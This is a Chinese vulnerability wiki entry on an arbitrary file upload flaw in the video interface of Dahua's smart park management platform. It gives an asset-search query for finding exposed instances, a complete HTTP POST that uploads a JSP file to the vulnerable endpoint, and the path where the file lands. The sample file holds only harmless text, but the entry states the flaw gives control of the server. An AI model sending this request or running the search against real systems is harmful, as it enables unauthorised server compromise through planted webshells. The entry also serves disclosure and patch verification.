# 大华 智慧园区综合管理平台 video 任意文件上传漏洞

## 漏洞描述

大华 智慧园区综合管理平台 video 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，控制服务器权限

## 漏洞影响

<a-checkbox checked>大华 智慧园区综合管理平台 	</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="dahua-智慧园区综合管理平台"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](/assets/PeiQi-Wiki/img/1645602936890-c40b0210-c98e-465a-b54d-4d5ce28cbdf1-20230812163903583.png)

验证POC

```php
POST /publishing/publishing/material/file/video HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 804
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip, deflate
Connection: close

--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Filedata"; filename="Test.jsp"

Test
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Submit"

submit
--dd8f988919484abab3816881c55272a7--
```

![img](/assets/PeiQi-Wiki/img/1691823930473-91166fc0-48f5-4c6c-b305-2237a53b13d6.png)

```php
/publishingImg/VIDEO/230812152005170200.jsp
```